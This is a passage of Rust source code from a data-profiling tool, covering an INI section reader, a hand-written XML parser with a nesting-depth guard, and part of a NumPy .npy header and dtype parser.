        if props.is_empty() {
            continue; // e.g. no general section before the first [header]
        }
        let mut record = serde_json::Map::new();
        for (k, v) in props {
            match record.get_mut(&k) {
                Some(JsonValue::Array(values)) => values.push(JsonValue::String(v)),
                Some(existing) => {
                    let first = existing.clone();
                    *existing = JsonValue::Array(vec![first, JsonValue::String(v)]);
                }
                None => {
                    record.insert(k, JsonValue::String(v));
                }
            }
        }
        let name = section_name.unwrap_or_else(|| "(default)".to_string());
        out.push((name, profile_json_records(&[record], n_samples)));
    }

    if out.is_empty() {
        bail!("no sections found in {path:?}");
    }
    Ok(out)
}

#[cfg(not(feature = "ini"))]
fn columns_from_ini(_path: &Path, _n_samples: usize) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
    bail!(
        "INI support isn't compiled in - rebuild with `cargo build --release --features ini` (or --features full)"
    )
}

// --- XML reader (opt-in via --features xml, hand-rolled - see
// `xml_support` below and CLAUDE.md's Dependency footprint section) ---
// XML's mixed content model (an element can carry attributes, text, and
// child elements all at once) doesn't map onto a single generic Value enum
// the way TOML/YAML/CBOR/MessagePack do, so this bridges by hand instead of
// via a ready-made dynamic type: attributes become `@name` keys, text
// content becomes a `#text` key (or, for a leaf element with only text and
// no attributes, the bare string - so `<name>Alice</name>` becomes "Alice"
// rather than {"#text": "Alice"}), and repeated same-name child elements
// pool into an array, same convention as everywhere else in this file.

/// A from-scratch XML parser, replacing `xmltree` (kept as a dev-only
/// cross-verification oracle - see Cargo.toml). Deliberately a *second*,
/// independent implementation from the OOXML/ODF-scoped one in
/// `xlsx_support` above, not a shared one - `xml` and `xlsx` are
/// independently toggleable Cargo features (this module must compile
/// and work with `--features xml` alone, so it can never reference
/// anything gated behind `xlsx`), and, more importantly, the two need
/// genuinely different behavior: the OOXML/ODF parser *preserves* a
/// namespace prefix verbatim (`r:id` is looked up as literally
/// `"r:id"`, since this project already knows OOXML's own fixed schema
/// prefixes), while this one - reading arbitrary, unknown, real-world
/// XML - *strips* prefixes, matching `xmltree`'s own observed behavior
/// (confirmed empirically, not assumed: `xmltree::Element.name` is
/// documented as excluding namespace info, and a synthetic file with
/// both a plain `<link>` and a namespaced `<atom:link>` produced a
/// single, merged `link` column through the old reader - independently
/// consistent with this project's own real-world validation, which
/// found the identical merge on a real BBC RSS feed mixing a plain
/// `<link>` with an Atom-namespaced one under one flattened name).
///
/// Namespace handling here is real URI resolution's cheap, deliberately
/// scoped stand-in: any element or attribute name containing a colon
/// has everything up to and including the first colon stripped, with
/// no validation that the prefix was ever actually declared via an
/// `xmlns:prefix="..."` binding, and no scoping (a prefix is stripped
/// the same way regardless of which element declared it or whether it
/// was ever redeclared partway through the document) - real XML
/// namespace resolution requires tracking a stack of prefix-to-URI
/// bindings as the document is descended, and this project's own reader
/// never uses the resolved URI at all (only ever the bare local name),
/// so that real machinery would add real complexity for zero
/// observable difference on any well-formed file. `xmlns` and
/// `xmlns:*` attributes themselves are dropped rather than exposed as
/// regular `@xmlns...` attributes, matching `xml-rs`'s own behavior
/// (confirmed empirically) of treating them as namespace bindings, not
/// regular attribute data.
///
/// Depth protection is structural here rather than a separate pre-parse
/// scan: unlike `xmltree::Element::parse` (which recurses once per
/// nesting level with nothing capping it - confirmed empirically to
/// stack-overflow the compiled binary on a 50,000-level-deep adversarial
/// document, the reason `xml_nesting_too_deep`'s pre-scan existed at
/// all), this parser's own recursive descent carries an explicit depth
/// counter and bails cleanly the moment it's exceeded - a strictly
/// stronger guarantee than a heuristic pre-scan can offer (that old
/// scan's own doc comment disclosed a real, if narrow, false-negative
/// gap: a literal unescaped `>` inside an attribute value could end its
/// tag scan early; a real recursive-descent parser has no equivalent
/// gap, since it's tracking actual parse state, not guessing at tag
/// boundaries from raw text).
#[cfg(feature = "xml")]
mod xml_support {
    use super::*;

    const MAX_XML_DEPTH: usize = 512;

    struct XmlElement {
        name: String,
        attrs: Vec<(String, String)>,
        children: Vec<XmlElement>,
        text: String,
    }

    fn xml_decode_entities(s: &str) -> String {
        if !s.contains('&') {
            return s.to_string();
        }
        let mut out = String::with_capacity(s.len());
        let mut chars = s.chars().peekable();
        while let Some(c) = chars.next() {
            if c != '&' {
                out.push(c);
                continue;
            }
            let rest: String = chars.clone().take_while(|&c| c != ';').collect();
            let consumed = rest.len() + 1; // + the trailing ';'
            let replacement = match rest.as_str() {
                "lt" => Some('<'),
                "gt" => Some('>'),
                "amp" => Some('&'),
                "apos" => Some('\''),
                "quot" => Some('"'),
                _ if rest.starts_with("#x") || rest.starts_with("#X") => {
                    u32::from_str_radix(&rest[2..], 16)
                        .ok()
                        .and_then(char::from_u32)
                }
                _ if rest.starts_with('#') => {
                    rest[1..].parse::<u32>().ok().and_then(char::from_u32)
                }
                _ => None,
            };
            match replacement {
                Some(ch) => {
                    out.push(ch);
                    for _ in 0..consumed {
                        chars.next();
                    }
                }
                None => out.push(c), // not a recognized entity - keep the '&' literally
            }
        }
        out
    }

    /// Strips a namespace prefix (everything up to and including the
    /// first `:`) from an element or attribute name - see this module's
    /// own doc comment for why this is a deliberate stand-in for real
    /// URI-based namespace resolution, not an oversight.
    fn xml_strip_prefix(name: String) -> String {
        match name.find(':') {
            Some(i) => name[i + 1..].to_string(),
            None => name,
        }
    }

    fn xml_skip_ws(chars: &[char], pos: &mut usize) {
        while chars.get(*pos).is_some_and(|c| c.is_whitespace()) {
            *pos += 1;
        }
    }

    fn xml_starts_with(chars: &[char], pos: usize, needle: &str) -> bool {
        let needle: Vec<char> = needle.chars().collect();
        chars.len() >= pos + needle.len() && chars[pos..pos + needle.len()] == needle[..]
    }

    fn xml_skip_until(chars: &[char], pos: &mut usize, needle: &str) -> Result<()> {
        while !xml_starts_with(chars, *pos, needle) {
            if *pos >= chars.len() {
                bail!("unterminated XML construct (expected {needle:?})");
            }
            *pos += 1;
        }
        *pos += needle.chars().count();
        Ok(())
    }

    /// Skips whitespace, comments, processing instructions (including the
    /// leading `<?xml ... ?>` declaration), and DOCTYPE declarations. A
    /// DOCTYPE with an internal subset (`<!DOCTYPE svg [ <!ENTITY ... > ]>`,
    /// occasionally emitted by SVG-authoring tools) needs its own
    /// `]`-then-`>` skip rather than a naive skip-to-first-`>`, since the
    /// internal subset's own declarations can themselves contain `>`
    /// characters well before the DOCTYPE's real closing one.
    fn xml_skip_misc(chars: &[char], pos: &mut usize) -> Result<()> {
        loop {
            xml_skip_ws(chars, pos);
            if xml_starts_with(chars, *pos, "<!--") {
                xml_skip_until(chars, pos, "-->")?;
            } else if xml_starts_with(chars, *pos, "<?") {
                xml_skip_until(chars, pos, "?>")?;
            } else if xml_starts_with(chars, *pos, "<!") {
                let has_internal_subset = {
                    let mut p = *pos;
                    while chars.get(p).is_some_and(|&c| c != '>' && c != '[') {
                        p += 1;
                    }
                    chars.get(p) == Some(&'[')
                };
                if has_internal_subset {
                    xml_skip_until(chars, pos, "]")?;
                    xml_skip_ws(chars, pos);
                }
                xml_skip_until(chars, pos, ">")?;
            } else {
                return Ok(());
            }
        }
    }

    fn xml_parse_name(chars: &[char], pos: &mut usize) -> Result<String> {
        let start = *pos;
        while chars
            .get(*pos)
            .is_some_and(|&c| !c.is_whitespace() && c != '>' && c != '/' && c != '=')
        {
            *pos += 1;
        }
        if *pos == start {
            bail!("expected an XML name");
        }
        Ok(chars[start..*pos].iter().collect())
    }

    /// Parses attributes, stripping a namespace prefix from each name
    /// and dropping `xmlns`/`xmlns:*` declarations entirely (they're
    /// namespace bindings, not regular attribute data - see this
    /// module's own doc comment).
    fn xml_parse_attrs(chars: &[char], pos: &mut usize) -> Result<Vec<(String, String)>> {
        let mut attrs = Vec::new();
        loop {
            xml_skip_ws(chars, pos);
            match chars.get(*pos) {
                Some('/') | Some('>') | None => return Ok(attrs),
                _ => {}
            }
            let name = xml_parse_name(chars, pos)?;
            xml_skip_ws(chars, pos);
            if chars.get(*pos) != Some(&'=') {
                bail!("expected '=' after attribute name '{name}'");
            }
            *pos += 1;
            xml_skip_ws(chars, pos);
            let quote = match chars.get(*pos) {
                Some(&q @ ('"' | '\'')) => q,
                _ => bail!("expected a quoted attribute value for '{name}'"),
            };
            *pos += 1;
            let start = *pos;
            while chars.get(*pos).is_some_and(|&c| c != quote) {
                *pos += 1;
            }
            if *pos >= chars.len() {
                bail!("unterminated attribute value for '{name}'");
            }
            let raw: String = chars[start..*pos].iter().collect();
            *pos += 1; // closing quote
            if name == "xmlns" || name.starts_with("xmlns:") {
                continue;
            }
            attrs.push((xml_strip_prefix(name), xml_decode_entities(&raw)));
        }
    }

    /// Parses one element (and everything nested inside it) starting at
    /// `<`. `depth` is this element's own nesting level (the root is 1);
    /// exceeding `MAX_XML_DEPTH` bails cleanly before recursing further,
    /// the structural depth guard this module's own doc comment
    /// describes.
    fn xml_parse_element(chars: &[char], pos: &mut usize, depth: usize) -> Result<XmlElement> {
        if depth > MAX_XML_DEPTH {
            bail!("more than {MAX_XML_DEPTH} levels of nested XML elements");
        }
        if chars.get(*pos) != Some(&'<') {
            bail!("expected '<' to start an element");
        }
        *pos += 1;
        let name = xml_strip_prefix(xml_parse_name(chars, pos)?);
        let attrs = xml_parse_attrs(chars, pos)?;
        xml_skip_ws(chars, pos);

        if xml_starts_with(chars, *pos, "/>") {
            *pos += 2;
            return Ok(XmlElement {
                name,
                attrs,
                children: Vec::new(),
                text: String::new(),
            });
        }
        if chars.get(*pos) != Some(&'>') {
            bail!("expected '>' or '/>' to close the start tag for '{name}'");
        }
        *pos += 1;

        let mut children = Vec::new();
        let mut text = String::new();
        loop {
            if *pos >= chars.len() {
                bail!("unexpected end of XML inside element '{name}'");
            }
            if xml_starts_with(chars, *pos, "<![CDATA[") {
                *pos += "<![CDATA[".len();
                let start = *pos;
                xml_skip_until(chars, pos, "]]>")?;
                let end = *pos - "]]>".len();
                text.push_str(&chars[start..end].iter().collect::<String>());
            } else if xml_starts_with(chars, *pos, "<!--") {
                xml_skip_until(chars, pos, "-->")?;
            } else if xml_starts_with(chars, *pos, "<?") {
                xml_skip_until(chars, pos, "?>")?;
            } else if xml_starts_with(chars, *pos, "</") {
                *pos += 2;
                let close_name = xml_parse_name(chars, pos)?;
                xml_skip_ws(chars, pos);
                if chars.get(*pos) != Some(&'>') {
                    bail!("expected '>' to close end tag '</{close_name}>'");
                }
                *pos += 1;
                if xml_strip_prefix(close_name.clone()) != name {
                    bail!("mismatched XML tags: '<{name}>' closed by '</{close_name}>'");
                }
                return Ok(XmlElement {
                    name,
                    attrs,
                    children,
                    text,
                });
            } else if chars[*pos] == '<' {
                children.push(xml_parse_element(chars, pos, depth + 1)?);
            } else {
                let start = *pos;
                while chars.get(*pos).is_some_and(|&c| c != '<') {
                    *pos += 1;
                }
                let raw: String = chars[start..*pos].iter().collect();
                text.push_str(&xml_decode_entities(&raw));
            }
        }
    }

    fn xml_parse(input: &str) -> Result<XmlElement> {
        let chars: Vec<char> = input.chars().collect();
        let mut pos = 0;
        xml_skip_misc(&chars, &mut pos)?;
        let root = xml_parse_element(&chars, &mut pos, 1)?;
        xml_skip_misc(&chars, &mut pos)?;
        Ok(root)
    }

    fn xml_element_to_json(el: &XmlElement) -> JsonValue {
        let mut obj = serde_json::Map::new();
        for (k, v) in &el.attrs {
            obj.insert(format!("@{k}"), JsonValue::String(v.clone()));
        }

        let mut text = String::new();
        let mut child_order: Vec<String> = Vec::new();
        let mut child_values: HashMap<String, Vec<JsonValue>> = HashMap::new();
        for child in &el.children {
            child_values
                .entry(child.name.clone())
                .or_insert_with(|| {
                    child_order.push(child.name.clone());
                    Vec::new()
                })
                .push(xml_element_to_json(child));
        }
        text.push_str(&el.text);
        for name in child_order {
            let mut values = child_values.remove(&name).unwrap();
            let value = if values.len() == 1 {
                values.pop().unwrap()
            } else {
                JsonValue::Array(values)
            };
            obj.insert(name, value);
        }

        let text = text.trim();
        if !text.is_empty() {
            if obj.is_empty() {
                return JsonValue::String(text.to_string());
            }
            obj.insert("#text".to_string(), JsonValue::String(text.to_string()));
        }

        if obj.is_empty() {
            JsonValue::Null
        } else {
            JsonValue::Object(obj)
        }
    }

    /// If the root element's children all share one tag name (the
    /// common `<root><item>...</item><item>...</item></root>` shape),
    /// each becomes a record - mirroring the JSON reader's `[...]`
    /// array-of-objects mode. Otherwise the whole document is one
    /// record, the same choice TOML and an INI section make for their
    /// own single-document shapes.
    pub(crate) fn columns_from_xml(
        path: &Path,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<ColumnProfile>> {
        let content =
            fs::read_to_string(path).with_context(|| format!("failed to read {path:?}"))?;
        let root =
            xml_parse(&content).with_context(|| format!("failed to parse {path:?} as XML"))?;

        let homogeneous = root.children.len() > 1
            && root
                .children
                .iter()
                .all(|e| e.name == root.children[0].name);

        let mut records: Vec<serde_json::Map<String, JsonValue>> = Vec::new();
        if homogeneous {
            for el in &root.children {
                match xml_element_to_json(el) {
                    JsonValue::Object(m) => records.push(m),
                    other => {
                        let mut m = serde_json::Map::new();
                        m.insert("#text".to_string(), other);
                        records.push(m);
                    }
                }
            }
        } else {
            match xml_element_to_json(&root) {
                JsonValue::Object(m) => records.push(m),
                _ => bail!(
                    "expected the root XML element in {path:?} to have attributes or child elements"
                ),
            }
        }

        if let Some(n) = nrows {
            records.truncate(n);
        }
        Ok(profile_json_records(&records, n_samples))
    }
}

#[cfg(feature = "xml")]
fn columns_from_xml(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    xml_support::columns_from_xml(path, nrows, n_samples)
}

#[cfg(not(feature = "xml"))]
fn columns_from_xml(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    bail!(
        "XML support isn't compiled in - rebuild with `cargo build --release --features xml` (or --features full)"
    )
}

// --- NumPy reader (opt-in via --features npy; covers .npy and .npz) ---
// A structured (record) dtype is the genuinely tabular case - one named
// field per column - and is handled precisely: fields are read byte-for-
// byte per this module's own DType/TypeStr description (a hand-rolled
// stand-in for npyz's own types - see CLAUDE.md's Dependency footprint
// section), decoded per TypeChar (int/uint/float by width and endianness,
// fixed-width byte/unicode strings trimmed of their right-zero-padding),
// with anything not representable as a simple value (a fixed-size
// sub-array field, `f16`, pickled `object` dtype) falling back to a hex
// dump rather than fabricating a value or failing the whole file. A plain
// (non-structured) array has no field names at all - numpy doesn't carry
// them - so it's treated like a headerless CSV: a 1D array is one column,
// a 2D array gets positional `col_0..col_N` columns; anything higher-
// dimensional doesn't have an honest 2D tabular reading, so it's a clear
// error rather than a guess. .npz is just a zip of named `.npy` streams,
// so - like SQLite's tables and Excel's sheets - each array becomes its
// own table; it reuses `zip_support::ZipArchive` (see that module's own
// header comment) rather than a second zip reader.
#[cfg(feature = "npy")]
mod npy_support {
    use super::*;

    // ---------------------------------------------------------------
    // A minimal Python-literal parser - just enough for an NPY header
    // dict (`{'descr': ..., 'fortran_order': ..., 'shape': ..., }`),
    // not a general Python expression evaluator. Verified directly
    // against real `numpy.save` output (a plain array, a structured
    // array, a Fortran-order array, and a record field with its own
    // fixed-size sub-array shape) rather than assumed from the NPY
    // format spec's prose alone - see the four worked examples this was
    // checked against in the commit that introduced this module.
    // ---------------------------------------------------------------

    #[derive(Debug, Clone)]
    enum PyValue {
        Str(String),
        Bool(bool),
        Int(i64),
        // A Python list or tuple - NPY headers never depend on which one
        // it actually is, so both parse to the same variant.
        Seq(Vec<PyValue>),
    }

    struct PyParser<'a> {
        s: &'a str,
        pos: usize,
    }

    impl<'a> PyParser<'a> {
        fn new(s: &'a str) -> Self {
            PyParser { s, pos: 0 }
        }

        fn peek(&self) -> Option<char> {
            self.s[self.pos..].chars().next()
        }

        fn bump(&mut self) -> Option<char> {
            let c = self.peek()?;
            self.pos += c.len_utf8();
            Some(c)
        }

        fn skip_ws(&mut self) {
            while matches!(self.peek(), Some(c) if c.is_whitespace()) {
                self.bump();
            }
        }

        fn expect(&mut self, c: char) -> Result<()> {
            self.skip_ws();
            if self.bump() == Some(c) {
                Ok(())
            } else {
                bail!(
                    "malformed NPY header: expected '{c}' at byte offset {}",
                    self.pos
                )
            }
        }

        fn parse_string(&mut self) -> Result<String> {
            let quote = match self.peek() {
                Some(c @ ('\'' | '"')) => c,
                _ => bail!(
                    "malformed NPY header: expected a quoted string at byte offset {}",
                    self.pos
                ),
            };
            self.bump();
            let mut out = String::new();
            loop {
                match self.bump() {
                    None => bail!("malformed NPY header: unterminated string"),
                    Some(c) if c == quote => break,
                    Some('\\') => match self.bump() {
                        Some('\\') => out.push('\\'),
                        Some('\'') => out.push('\''),
                        Some('"') => out.push('"'),
                        Some('n') => out.push('\n'),
                        Some('r') => out.push('\r'),
                        Some('t') => out.push('\t'),
                        Some(other) => out.push(other),
                        None => bail!("malformed NPY header: unterminated escape sequence"),
                    },
                    Some(c) => out.push(c),
                }
            }
            Ok(out)
        }

        fn parse_int(&mut self) -> Result<i64> {
            let start = self.pos;
            if self.peek() == Some('-') {
                self.bump();
            }
            let mut any_digit = false;
            while matches!(self.peek(), Some(c) if c.is_ascii_digit()) {
                self.bump();
                any_digit = true;
            }
            if !any_digit {
                bail!(
                    "malformed NPY header: expected an integer at byte offset {}",
                    start
                );
            }
            self.s[start..self.pos].parse::<i64>().with_context(|| {
                format!("malformed NPY header: invalid integer at byte offset {start}")
            })
        }

        fn parse_seq(&mut self, open: char, close: char) -> Result<PyValue> {
            self.expect(open)?;
            let mut items = Vec::new();
            loop {
                self.skip_ws();
                if self.peek() == Some(close) {
                    self.bump();
                    break;
                }
                items.push(self.parse_value()?);
                self.skip_ws();
                match self.peek() {
                    Some(',') => {
                        self.bump();
                    }
                    Some(c) if c == close => {
                        self.bump();
                        break;
                    }
                    _ => bail!(
                        "malformed NPY header: expected ',' or '{close}' at byte offset {}",
                        self.pos
                    ),
                }
            }
            Ok(PyValue::Seq(items))
        }

        fn parse_value(&mut self) -> Result<PyValue> {
            self.skip_ws();
            match self.peek() {
                Some('\'' | '"') => self.parse_string().map(PyValue::Str),
                Some('(') => self.parse_seq('(', ')'),
                Some('[') => self.parse_seq('[', ']'),
                Some(c) if c.is_ascii_digit() || c == '-' => self.parse_int().map(PyValue::Int),
                _ if self.s[self.pos..].starts_with("True") => {
                    self.pos += 4;
                    Ok(PyValue::Bool(true))
                }
                _ if self.s[self.pos..].starts_with("False") => {
                    self.pos += 5;
                    Ok(PyValue::Bool(false))
                }
                _ if self.s[self.pos..].starts_with("None") => {
                    self.pos += 4;
                    Ok(PyValue::Seq(Vec::new())) // never a real NPY header value; a harmless placeholder
                }
                _ => bail!(
                    "malformed NPY header: unexpected character at byte offset {}",
                    self.pos
                ),
            }
        }

        /// Parses the header's own top-level `{...}` dict into an ordered
        /// list of (key, value) pairs - a plain `Vec` rather than a map,
        /// since there are only ever 3 keys and preserving source order
        /// costs nothing.
        fn parse_dict(&mut self) -> Result<Vec<(String, PyValue)>> {
            self.expect('{')?;
            let mut pairs = Vec::new();
            loop {
                self.skip_ws();
                if self.peek() == Some('}') {
                    self.bump();
                    break;
                }
                let key = self.parse_string()?;
                self.expect(':')?;
                let value = self.parse_value()?;
                pairs.push((key, value));
                self.skip_ws();
                match self.peek() {
                    Some(',') => {
                        self.bump();
                    }
                    Some('}') => {
                        self.bump();
                        break;
                    }
                    _ => bail!(
                        "malformed NPY header: expected ',' or '}}' at byte offset {}",
                        self.pos
                    ),
                }
            }
            Ok(pairs)
        }
    }

    // ---------------------------------------------------------------
    // TypeStr / DType - a hand-rolled stand-in for npyz's own types of
    // the same name, covering exactly what real `numpy.save` emits.
    // Verified field-by-field against npyz's own `type_str.rs` (the
    // endianness/type-character grammar, and which TypeChar values need
    // an explicit width vs. which allow an empty one) before being
    // trusted, the same "verify against source" discipline as every
    // other hand-roll in this project.
    // ---------------------------------------------------------------

    #[derive(Debug, Clone, Copy, PartialEq, Eq)]
    enum Endianness {
        Little,
        Big,
        Irrelevant,
    }

    #[derive(Debug, Clone, Copy, PartialEq, Eq)]
    enum TypeChar {
        Bool,
        Int,
        Uint,
        Float,
        Complex,
        TimeDelta,
        DateTime,
        ByteStr,
        UnicodeStr,
        Object,
        RawData,
    }

    #[derive(Debug, Clone)]
    struct TypeStr {
        endianness: Endianness,
        type_char: TypeChar,
        size: u64,
    }

    impl TypeStr {
        /// Get the number of bytes a single value occupies, or `None` if
        /// the size isn't fixed (the pickled `object` dtype) - mirrors
        /// `npyz::TypeStr::num_bytes` exactly, including `U`'s own
        /// 4-bytes-per-code-point rule (numpy's fixed Unicode strings are
        /// stored as UCS-4/UTF-32, so `size` there counts code points,
        /// not bytes).
        fn num_bytes(&self) -> Option<usize> {
            let size = usize::try_from(self.size).ok()?;
            match self.type_char {
                TypeChar::Object => None,
                TypeChar::UnicodeStr => size.checked_mul(4),
                _ => Some(size),
            }
        }
    }

    fn parse_type_str(s: &str) -> Result<TypeStr> {
        let mut chars = s.chars();
        let e = chars
            .next()
            .with_context(|| format!("invalid numpy type string '{s}': empty"))?;
        let endianness = match e {
            '<' => Endianness::Little,
            '>' => Endianness::Big,
            '|' => Endianness::Irrelevant,
            _ => bail!("invalid numpy type string '{s}': unknown endianness character '{e}'"),
        };
        let t = chars
            .next()
            .with_context(|| format!("invalid numpy type string '{s}': missing type character"))?;
        let type_char = match t {
            'b' => TypeChar::Bool,
            'i' => TypeChar::Int,
            'u' => TypeChar::Uint,
            'f' => TypeChar::Float,
            'c' => TypeChar::Complex,
            'm' => TypeChar::TimeDelta,
            'M' => TypeChar::DateTime,
            'S' | 'a' => TypeChar::ByteStr,
            'U' => TypeChar::UnicodeStr,
            'O' => TypeChar::Object,
            'V' => TypeChar::RawData,
            _ => bail!("invalid numpy type string '{s}': unknown type character '{t}'"),
        };
        // Anything after the digits (a `[us]`-style time-unit suffix on
        // `m`/`M` types) is deliberately not interpreted - this project
        // never resolves timedelta64/datetime64 to a real date, only
        // labels them "Timestamp" and renders the raw stored integer
        // (see npy_type_label below), so the unit itself carries no
        // information this tool acts on.
        let rest = chars.as_str();
        let digits = rest.split('[').next().unwrap_or(rest);
        let size: u64 = if digits.is_empty() {
            if type_char == TypeChar::Object {
                0
            } else {
                bail!("invalid numpy type string '{s}': missing size");
            }
        } else {
            digits
                .parse()
                .with_context(|| format!("invalid numpy type string '{s}': bad size '{digits}'"))?
        };
        Ok(TypeStr {
            endianness,
            type_char,
            size,
        })
    }

    #[derive(Debug, Clone)]
    struct Field {
        name: String,
        dtype: DType,
    }

    #[derive(Debug, Clone)]
    enum DType {
        Plain(TypeStr),
        Array(u64, Box<DType>),
        Record(Vec<Field>),
    }

    impl DType {
        fn num_bytes(&self) -> Option<usize> {
            match self {
                DType::Plain(ty) => ty.num_bytes(),
                DType::Array(n, inner) => inner.num_bytes()?.checked_mul(usize::try_from(*n).ok()?),
                DType::Record(fields) => fields
                    .iter()
                    .try_fold(0usize, |acc, f| acc.checked_add(f.dtype.num_bytes()?)),
            }
        }

        fn uses_pickled_array(&self) -> bool {
            match self {
                DType::Plain(ty) => ty.type_char == TypeChar::Object,
                DType::Array(_, inner) => inner.uses_pickled_array(),
                DType::Record(fields) => fields.iter().any(|f| f.dtype.uses_pickled_array()),
            }
        }

        /// Converts a parsed `descr` value (either a plain type string, or
        /// a list of 2/3-element tuples for a structured/record dtype)
        /// into a `DType` - mirrors `npyz::DType::from_descr` and its
        /// `convert_tuple_to_record_field` helper, including a 3-tuple's
        /// third element (a shape) nesting `Array` from the innermost
        /// dimension outward, verified against a real
        /// `numpy.save`-produced sub-array field (`('vec', '<f4', (3,))`).
        fn from_descr(v: &PyValue) -> Result<Self> {
            match v {
                PyValue::Str(s) => Ok(DType::Plain(parse_type_str(s)?)),
                PyValue::Seq(items) => {
                    let fields = items
                        .iter()
                        .map(|item| {
                            let PyValue::Seq(tuple) = item else {
                                bail!("malformed NPY header: record dtype entry must be a tuple");
                            };
                            if tuple.len() != 2 && tuple.len() != 3 {
                                bail!(
                                    "malformed NPY header: record dtype entry must have 2 or 3 items, got {}",
                                    tuple.len()
                                );
                            }
                            let PyValue::Str(name) = &tuple[0] else {
                                bail!("malformed NPY header: record dtype entry name must be a string");
                            };
                            let mut dtype = DType::from_descr(&tuple[1])?;
                            if let Some(shape_val) = tuple.get(2) {
                                let PyValue::Seq(dims) = shape_val else {
                                    bail!(
                                        "malformed NPY header: record dtype sub-array shape must be a tuple"
                                    );
                                };
                                let mut dims_u64 = dims
                                    .iter()
                                    .map(|d| match d {
                                        PyValue::Int(n) if *n >= 0 => Ok(*n as u64),
                                        _ => bail!(
                                            "malformed NPY header: sub-array shape must contain non-negative integers"
                                        ),
                                    })
                                    .collect::<Result<Vec<u64>>>()?;
                                while let Some(dim) = dims_u64.pop() {
                                    dtype = DType::Array(dim, Box::new(dtype));
                                }
                            }
                            Ok(Field {
                                name: name.clone(),
                                dtype,
                            })
                        })
                        .collect::<Result<Vec<_>>>()?;
                    Ok(DType::Record(fields))
                }
                _ => bail!("malformed NPY header: 'descr' must be a string or a list"),
            }
        }
    }

    // ---------------------------------------------------------------
    // Header parsing (NPY format spec, verified against npyz's own
    // `header.rs` - magic/version layout, the version-dependent header-
    // length field width, and the trailing-newline-stripped header text
    // being a single Python dict literal - and against four real
    // `numpy.save` outputs inspected byte-for-byte: a plain 1D array, a
    // structured array, a Fortran-order 2D array, and a sub-array field).
    // ---------------------------------------------------------------

    #[derive(Clone, Copy)]
    enum Order {
        C,
        Fortran,
    }

    struct NpyHeader {
        dtype: DType,
        shape: Vec<u64>,
        order: Order,
    }

    fn read_npy_header<R: std::io::Read>(reader: &mut R) -> Result<NpyHeader> {
        let mut magic_version = [0u8; 8];
        reader
            .read_exact(&mut magic_version)
            .context("truncated .npy file: missing magic/version bytes")?;
        if &magic_version[0..6] != b"\x93NUMPY" {
            bail!("not a valid .npy file (bad magic bytes)");
        }
        let major = magic_version[6];
        let header_size = match major {
            1 => {
                let mut b = [0u8; 2];
                reader
                    .read_exact(&mut b)
                    .context("truncated .npy file: missing header length")?;
                u16::from_le_bytes(b) as usize
            }
            2 | 3 => {
                let mut b = [0u8; 4];
                reader
                    .read_exact(&mut b)
                    .context("truncated .npy file: missing header length")?;
                u32::from_le_bytes(b) as usize
            }
            other => bail!(
                "unsupported .npy format version {other}.{} - only versions 1.x, 2.x, and 3.x are supported",
                magic_version[7]
            ),
        };

        let mut header_text = vec![0u8; header_size];
        reader
            .read_exact(&mut header_text)
            .context("truncated .npy file: missing header text")?;
        let text = std::str::from_utf8(&header_text)
            .context("malformed .npy file: header is not valid UTF-8")?;
        let text = text.strip_suffix('\n').unwrap_or(text);

        let pairs = PyParser::new(text)
            .parse_dict()
            .context("malformed .npy file: could not parse header dict")?;

        let mut descr = None;
        let mut fortran_order = None;
        let mut shape_val = None;
        for (key, value) in pairs {
            match key.as_str() {
                "descr" => descr = Some(value),
                "fortran_order" => fortran_order = Some(value),
                "shape" => shape_val = Some(value),
                _ => {} // forward-compatible: ignore any other key
            }
        }

        let dtype =
            DType::from_descr(&descr.context("malformed .npy file: header is missing 'descr'")?)?;
        let fortran_order = match fortran_order
            .context("malformed .npy file: header is missing 'fortran_order'")?
        {
            PyValue::Bool(b) => b,
            _ => bail!("malformed .npy file: 'fortran_order' must be a bool"),
        };
        let shape = match shape_val.context("malformed .npy file: header is missing 'shape'")? {
            PyValue::Seq(items) => items
                .iter()
                .map(|v| match v {
                    PyValue::Int(n) if *n >= 0 => Ok(*n as u64),
                    _ => bail!("malformed .npy file: 'shape' must contain non-negative integers"),
                })
                .collect::<Result<Vec<u64>>>()?,
            _ => bail!("malformed .npy file: 'shape' must be a tuple"),
        };

        Ok(NpyHeader {
            dtype,
            shape,
            order: if fortran_order {
                Order::Fortran
            } else {
                Order::C
            },
        })
    }

    // ---------------------------------------------------------------
    // Value stringification - ported unchanged in spirit from this
    // project's previous npyz-backed version, just retargeted at the
    // local TypeStr/DType above instead of npyz's own types.
    // ---------------------------------------------------------------

    fn npy_read_uint(bytes: &[u8], big_endian: bool) -> Option<u64> {
        Some(match bytes.len() {
            1 => bytes[0] as u64,
            2 => {
                let b: [u8; 2] = bytes.try_into().ok()?;
                if big_endian {
                    u16::from_be_bytes(b)
                } else {
                    u16::from_le_bytes(b)
                }
                .into()
            }
            4 => {
                let b: [u8; 4] = bytes.try_into().ok()?;
                if big_endian {
                    u32::from_be_bytes(b)
                } else {
                    u32::from_le_bytes(b)
                }
                .into()
            }
            8 => {
                let b: [u8; 8] = bytes.try_into().ok()?;
                if big_endian {
                    u64::from_be_bytes(b)
                } else {
                    u64::from_le_bytes(b)
                }
            }
            _ => return None,
        })
    }

    fn npy_hex(bytes: &[u8]) -> String {
        bytes.iter().map(|b| format!("{b:02x}")).collect()
    }

    fn npy_scalar_to_string(ty: &TypeStr, bytes: &[u8]) -> String {
        let big_endian = ty.endianness == Endianness::Big;
        match ty.type_char {
            TypeChar::Bool => (bytes.first() == Some(&1)).to_string(),
            TypeChar::Int => match (bytes.len(), npy_read_uint(bytes, big_endian)) {
                (1, Some(v)) => (v as u8 as i8).to_string(),
                (2, Some(v)) => (v as u16 as i16).to_string(),
                (4, Some(v)) => (v as u32 as i32).to_string(),
                (8, Some(v)) => (v as i64).to_string(),
                _ => npy_hex(bytes),
            },
            TypeChar::Uint | TypeChar::TimeDelta | TypeChar::DateTime => {
                npy_read_uint(bytes, big_endian).map_or_else(|| npy_hex(bytes), |v| v.to_string())
            }
            TypeChar::Float => match bytes.len() {
                4 => {
                    let b: [u8; 4] = bytes.try_into().unwrap();
                    if big_endian {
                        f32::from_be_bytes(b)
                    } else {
                        f32::from_le_bytes(b)
                    }
                    .to_string()
                }
                8 => {
                    let b: [u8; 8] = bytes.try_into().unwrap();
                    if big_endian {
